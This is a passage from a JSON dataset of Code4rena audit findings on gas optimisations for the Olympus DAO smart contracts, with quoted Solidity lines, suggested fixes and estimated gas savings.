      "title": "[G-02]  `storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **188 639**<br>\nMethod Call Gas Saved: **5 032**<br>\n\nIt may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.\n\n*   src/Kernel.sol:[379](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379)\n\n```solidity\n379        Policy[] memory dependents = moduleDependents[keycode_];\n```\n\nfix(the same for others):\n\n```solidity\nPolicy[] storage dependents = moduleDependents[keycode_];\n```\n\n*   src/policies/BondCallback.sol:[179](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179)\n\n```solidity\n179        uint256[2] memory marketAmounts = _amountsPerMarket[id_];\n```\n\n*   src/policies/Governance.sol:[206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206)\n\n```solidity\n206        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n```\n\n*   src/policies/Operator.sol:[205-206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206), [384-385](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385), [439-440](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440), [666](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666)\n\n```solidity\n205        /// Cache config in memory\n206        Config memory config_ = _config;\n...\n384            /// Cache config struct to avoid multiple SLOADs\n385            Config memory config_ = _config;\n...\n439            /// Cache config struct to avoid multiple SLOADs\n440            Config memory config_ = _config;\n...\n666        Regen memory regen = _status.low;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-02--storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-7-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5154",
      "title": "[G-15] Duplicated require()/revert() checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nMethod Call Gas Saved: **8 111**\n\n*   [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)\n\n```solidity\nif (!initialized) revert Price_NotInitialized(); // @note 4 instances\n```\n\n**[0xLienid (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/39)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-15-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "5152",
      "title": "[G-13] Don't compare boolean expressions to boolean literals (2 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **1 607**\n\n*   src/policies/Governance.sol:[223](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223), [306](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L306)\n\n```solidity\n223        if (proposalHasBeenActivated[proposalId_] == true) {\n...\n306        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-13-dont-compare-boolean-expressions-to-boolean-literals-2-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5151",
      "title": "[G-12] Deleting a struct is cheaper than creating a new struct with null values. (1 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **4 207**<br>\nMethod Call Gas Saved: **40**<br>\n\n*   src/policies/Governance.sol:[288](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L288)\n\n```solidity\n288        activeProposal = ActivatedProposal(0, 0);\n```\n\nfix:\n\n```solidity\n    delete activeProposal;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-12-deleting-a-struct-is-cheaper-than-creating-a-new-struct-with-null-values-1-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5149",
      "title": "[G-10] Use named `returns` for local variables where it is possible (3 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **5 400**\n\n*   src/Kernel.sol:[130-135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L130-L135)\n\n```solidity\n130    /// @notice Function to grab module address from a given keycode.\n131    function getModuleAddress(Keycode keycode_) internal view returns (address) {\n132        address moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));\n133        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\n134        return moduleForKeycode;\n135    }\n```\n\nfix:\n\n```solidity\n    function getModuleAddress(Keycode keycode_) internal view returns (address moduleForKeycode) {\n        moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));\n        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);\n    }\n```\n\n*   src/modules/INSTR.sol:[41-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L41-L79)\n\n```solidity\n41    /// @notice Store a list of Instructions to be executed in the future.\n42    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {\n43        uint256 length = instructions_.length;\n44        uint256 instructionsId = ++totalInstructions;\n45\n46        Instruction[] storage instructions = storedInstructions[instructionsId];\n...\n76        emit InstructionsStored(instructionsId);\n77\n78        return instructionsId;\n79    }\n```\n\n*   src/modules/PRICE.sol:[153-180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L153-L180)\n\n```solidity\n153    /// @notice Get the current price of OHM in the Reserve asset from the price feeds\n154    function getCurrentPrice() public view returns (uint256) {\n...\n177        uint256 currentPrice = (ohmEthPrice * _scaleFactor) / reserveEthPrice;\n178\n179        return currentPrice;\n180    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-10-use-named-returns-for-local-variables-where-it-is-possible-3-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5148",
      "title": "[G-09] Increment optimization (18 instances)",
      "impact": "GAS",
      "content": "\nFor a uint256 i variable, the following is true with the Optimizer enabled at 10k:\n\nIncrement:\n\ni += 1 is the most expensive form<br>\ni++ costs 6 gas less than i += 1<br>\n\\++i costs 5 gas less than i++ (11 gas less than i += 1)<br>\n\nDecrement:\n\ni -= 1 is the most expensive form<br>\ni-- costs 11 gas less than i -= 1<br>\n\\--i costs 5 gas less than i-- (16 gas less than i -= 1)<br>\n\n### [G-09.1]  Prefix increments are cheaper than postfix increments, especially when it's used in for-loops (3 instances).\n\nDeployment Gas Saved: **400**\n\n*   src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)\n\n```solidity\n49            i++;\n...\n64            i++;\n```\n\n*   src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488)\n\nNOTE: in case of 670 675 686 691 not applicable and gas will be lost\n\n```solidity\n488            decimals++;\n```\n\n### [G-09.2] `<x> = <x> + 1` even more efficient than pre increment.(18 instances)\n\nDeployment Gas Saved: **14 217**\n\n*   src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)\n\n```solidity\n49            i++;\n...\n64            i++;\n```\n\n*   src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488), [670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670), [675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675), [686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686), [691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691)\n*\n\n```solidity\n488            decimals++;\n...\n670                _status.low.count++;\n...\n675                _status.low.count--;\n...\n686                _status.high.count++;\n...\n691                _status.high.count--;\n```\n\n*   src/Kernel.sol:[313](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L313), [357](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L357), [369](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L369), [386](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L386), [404](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L404), [429](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L429)\n\n```solidity\n313                ++i;\n...\n357                ++i;\n...\n369                ++j;\n...\n386                ++i;\n...\n404                ++i;\n...\n429                ++i;\n```\n\n*   src/modules/INSTR.sol:[72](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L72)\n\n```solidity\n72                ++i;\n```\n\n*   src/modules/PRICE.sol:[225](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L225)\n\n```solidity\n225                ++i;\n```\n\n*   src/policies/BondCallback.sol:[163](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L163)\n\n```solidity\n163                ++i;\n```\n\n*   src/policies/Governance.sol:[281](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L281)\n\n```solidity\n281                ++step;\n```\n\n*   src/policies/TreasuryCustodian.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L62)\n\n```solidity\n62                ++j;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-09-increment-optimization-18-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5147",
      "title": "[G-08] Expressions that cannot be overflowed can be unchecked (5 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **23 016**\n\n*   src/Kernel.sol:[299-300](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L299-L300), [309-310](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L309-L310)\n\n```solidity\n299        activePolicies.push(policy_);\n300        getPolicyIndex[policy_] = activePolicies.length - 1; // @note cannot be overflowed due to a previous push\n...\n309            moduleDependents[keycode].push(policy_);\n310            getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1; // @note cannot be overflowed due to a previous push\n```\n\n*   src/modules/PRICE.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L89), [144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [171](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L171)\n\n```solidity\n89         uint256 exponent = decimals + reserveEthDecimals - ohmEthDecimals; //@note overflow is not possible, if an underflow occurs, the next statement will revert\n...\n144        nextObsIndex = (nextObsIndex + 1) % numObs; //@note numObs can not be equal 0 during to check in constructor\n...\n171            if (updatedAt < block.timestamp - uint256(observationFrequency)) // @note can not be underflowed due to ` - 3 * uint256(observationFrequency)` in 165\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-08-expressions-that-cannot-be-overflowed-can-be-unchecked-5-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5146",
      "title": "[G-07] State variables can be packed into fewer storage slots (3 instances)",
      "impact": "GAS",
      "content": "\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper.\n\n**NOTE**: one slot = 32 bytes\n\nDeployment Gas Saved: **23 292**<br>\nMethod Call Gas Saved: **1 711**<br>\n\n*   src/policies/Heart.sol:[32-48](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48)\n\nuint256(32), address(20), bool(1)\n\n```solidity\n32     /// @notice Status of the Heart, false = stopped, true = beating\n33     bool public active; // @note put below _operator\n34\n35     /// @notice Timestamp of the last beat (UTC, in seconds)\n36     uint256 public lastBeat;\n37\n38     /// @notice Reward for beating the Heart (in reward token decimals)\n39     uint256 public reward;\n40\n41     /// @notice Reward token address that users are sent for beating the Heart\n42     ERC20 public rewardToken;\n43\n44     // Modules\n45     OlympusPrice internal PRICE;\n46\n47     // Policies\n48     IOperator internal _operator;\n```\n\nfix:\n\n```solidity\nuint256 public lastBeat;\nuint256 public reward;\nERC20 public rewardToken;\nOlympusPrice internal PRICE;\nIOperator internal _operator;\nbool public active;\n```\n\n*   src/modules/PRICE.sol:[31-65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65)\n\n**NOTE**: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter\n\nuint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)\n\n```solidity\ninherit Kernel public kernel;\n...\n31     /// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.\n32     AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;\n33     AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;\n34\n35     /// @dev Moving average data\n36     uint256 internal _movingAverage; /// See getMovingAverage()\n37\n38     /// @notice Array of price observations. Check nextObsIndex to determine latest data point.\n39     /// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.\n40     ///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must be re-initialized.\n41     uint256[] public observations;\n42\n43     /// @notice Index of the next observation to make. The current value at this index is the oldest observation.\n44     uint32 public nextObsIndex;\n45\n46     /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.\n47     uint32 public numObservations;\n48\n49     /// @notice Frequency (in seconds) that observations should be stored.\n50     uint48 public observationFrequency;\n51\n52     /// @notice Duration (in seconds) over which the moving average is calculated.\n53     uint48 public movingAverageDuration;\n54\n55     /// @notice Unix timestamp of last observation (in seconds).\n56     uint48 public lastObservationTime;\n57\n58     /// @notice Number of decimals in the price values provided by the contract.\n59     uint8 public constant decimals = 18;\n60\n61     /// @notice Whether the price module is initialized (and therefore active).\n62     bool public initialized;\n63\n64     // Scale factor for converting prices, calculated from decimal values.\n65     uint256 internal immutable _scaleFactor;\n```\n\nfix:\n\n```solidity\nuint48 public observationFrequency;\nuint48 public movingAverageDuration;\nAggregatorV2V3Interface internal immutable _ohmEthPriceFeed;\nAggregatorV2V3Interface internal immutable _reserveEthPriceFeed;\nuint256 internal _movingAverage; /// See getMovingAverage()\nuint256[] public observations;\nuint32 public nextObsIndex;\nuint32 public numObservations;\nuint48 public lastObservationTime;\nuint8 public constant decimals = 18;\nbool public initialized;\nuint256 internal immutable _scaleFactor;\n```\n\n*   src/policies/Operator.sol:[58-89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L58-L89)\n\nuint32(4), uint8(1), address(20), bool(1)\n\n```solidity\n58     /// Operator variables, defined in the interface on the external getter functions\n59     Status internal _status;\n60     Config internal _config;\n61\n62     /// @notice    Whether the Operator has been initialized\n63     bool public initialized;\n64\n65     /// @notice    Whether the Operator is active\n66     bool public active;\n67\n68     /// Modules\n69     OlympusPrice internal PRICE;\n70     OlympusRange internal RANGE;\n71     OlympusTreasury internal TRSRY;\n72     OlympusMinter internal MINTR;\n73\n74     /// External contracts\n75     /// @notice     Auctioneer contract used for cushion bond market deployments\n76     IBondAuctioneer public auctioneer;\n77     /// @notice     Callback contract used for cushion bond market payouts\n78     IBondCallback public callback;\n79\n80     /// Tokens\n81     /// @notice     OHM token contract\n82     ERC20 public immutable ohm;\n83     uint8 public immutable ohmDecimals;\n84     /// @notice     Reserve token contract\n85     ERC20 public immutable reserve;\n86     uint8 public immutable reserveDecimals;\n87\n88     /// Constants\n89     uint32 public constant FACTOR_SCALE = 1e4;\n```\n\nfix:\n\n```solidity\nStatus internal _status;\nConfig internal _config;\nOlympusPrice internal PRICE;\nOlympusRange internal RANGE;\nOlympusTreasury internal TRSRY;\nOlympusMinter internal MINTR;\nIBondAuctioneer public auctioneer;\nIBondCallback public callback;\nbool public initialized;\nbool public active;\nERC20 public immutable ohm;\nuint8 public immutable ohmDecimals;\nERC20 public immutable reserve;\nuint8 public immutable reserveDecimals;\nuint32 public constant FACTOR_SCALE = 1e4;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-07-state-variables-can-be-packed-into-fewer-storage-slots-3-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5145",
      "title": "[G-06]  Using bools for storage incurs overhead (6 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **23 611**<br>\nMethod Call Gas Saved: **4 485**<br>\n\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past.\n\n**Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case.\n\n*   src/Kernel.sol:[181](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181), [194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194), [197](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197)\n\n```solidity\n181    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; //@note D:3200 M:1754\n...\n194    mapping(address => mapping(Role => bool)) public hasRole; //@note D:−3016 M:2298\n...\n197    mapping(Role => bool) public isRole; //@note D:2407\n```\n\n*   src/policies/Governance.sol:[105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105), [117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117),\n\n```solidity\n105    mapping(uint256 => bool) public proposalHasBeenActivated; //@note D:3007\n...\n117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; //@note D:3007\n```\n\n*   src/modules/PRICE.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)\n\n```solidity\n62     bool public initialized; //@note D:11813\n```\n\n**Expensive method calls**:\n\nIt's just to show which bool is better left in the code\n\n*   src/policies/Operator.sol\n\n```solidity\n63     bool public initialized; //@note D:5808 M:-22036\n...\n66     bool public active; //@note D:-32775 M:-48896\n```\n\n*   src/policies/Heart.sol\n\n```solidity\n33     bool public active; //@note D:-382\n```\n\n*   src/policies/BondCallback.sol\n\n```solidity\n24     mapping(address => mapping(uint256 => bool)) public approvedMarkets; //@note D:-44192\n```\n\n*   src/Kernel.sol\n\n```solidity\n113    bool public isActive; //@note D:20923 M:-247184\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-06--using-bools-for-storage-incurs-overhead-6-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5144",
      "title": "[G-05] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **24 021**<br>\nMethod Call Gas Saved: **614**<br>\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\n*   src/policies/Heart.sol:[112-113](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113)\n\n```solidity\n112        rewardToken.safeTransfer(to_, reward);\n113        emit RewardIssued(to_, reward);\n```\n\nfix:\n\n```solidity\n        uint256 reward = reward;\n        rewardToken.safeTransfer(to_, reward);\n        emit RewardIssued(to_, reward);\n```\n\n*   src/policies/BondCallback.sol:[68-75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75)\n\n```solidity\n68         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n69         Keycode MINTR_KEYCODE = MINTR.KEYCODE();\n70\n71         requests = new Permissions[](4);\n72         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n73         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);\n74         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\n75         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\n```\n\nfix(similar for other policies):\n\n```solidity\n    OlympusTreasury ltrsry = TRSRY;\n    OlympusMinter lmintr = MINTR;\n    Keycode TRSRY_KEYCODE = ltrsry.KEYCODE();\n    Keycode MINTR_KEYCODE = lmintr.KEYCODE();\n\n    requests = new Permissions[](4);\n\n    requests[0] = Permissions(TRSRY_KEYCODE, ltrsry.setApprovalFor.selector);\n    requests[1] = Permissions(TRSRY_KEYCODE, ltrsry.withdrawReserves.selector);\n    requests[2] = Permissions(MINTR_KEYCODE, lmintr.mintOhm.selector);\n    requests[3] = Permissions(MINTR_KEYCODE, lmintr.burnOhm.selector);\n```\n\n*   src/policies/Governance.sol:[77-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79)\n\n```solidity\n77         requests = new Permissions[](2);\n78         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);\n79         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);\n```\n\n*   src/policies/Operator.sol:[172-185](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185)\n\n```solidity\n172        Keycode RANGE_KEYCODE = RANGE.KEYCODE();\n173        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n174        Keycode MINTR_KEYCODE = MINTR.KEYCODE();\n175\n176        requests = new Permissions[](9);\n177        requests[0] = Permissions(RANGE_KEYCODE, RANGE.updateCapacity.selector);\n178        requests[1] = Permissions(RANGE_KEYCODE, RANGE.updateMarket.selector);\n179        requests[2] = Permissions(RANGE_KEYCODE, RANGE.updatePrices.selector);\n180        requests[3] = Permissions(RANGE_KEYCODE, RANGE.regenerate.selector);\n181        requests[4] = Permissions(RANGE_KEYCODE, RANGE.setSpreads.selector);\n182        requests[5] = Permissions(RANGE_KEYCODE, RANGE.setThresholdFactor.selector);\n183        requests[6] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n184        requests[7] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);\n185        requests[8] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);\n```\n\n*   src/policies/PriceConfig.sol:[32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)\n\n```solidity\n32        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector);\n33        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);\n34        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);\n```\n\n*   src/policies/TreasuryCustodian.sol:[35-39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39)\n\n```solidity\n35        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();\n36\n37        requests = new Permissions[](2);\n38        requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);\n39        requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);\n```\n\n*   src/policies/VoterRegistration.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35)\n\n```solidity\n33        permissions = new Permissions[](2);\n34        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector);\n35        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-05-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "5143",
      "title": "[G-04] Use elementary types or a user-defined `type` instead of a `struct` that has only one member (1 instances)",
      "impact": "GAS",
      "content": "\nDeployment Gas Saved: **30 714**<br>\nMethod Call Gas Saved: **1 037**<br>\n\n*   src/modules/RANGE.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35)\n\n```solidity\n33     struct Line {\n34         uint256 price; // Price for the specified level\n35     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-04-use-elementary-types-or-a-user-defined-type-instead-of-a-struct-that-has-only-one-member-1-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5142",
      "title": "[G-03]  Using `private` rather than `public` for constants, saves gas (8 instances)",
      "impact": "GAS",
